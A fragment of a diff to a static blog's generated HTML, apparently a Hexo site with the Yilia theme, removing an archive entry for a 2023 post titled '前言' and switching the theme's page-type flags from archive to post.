-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2023/05/30/%E5%89%8D%E8%A8%80/" class="archive-article-date">
-  	<time datetime="2023-05-30T05:40:33.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-05-30</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2023/05/30/%E5%89%8D%E8%A8%80/">前言</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -352,8 +377,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
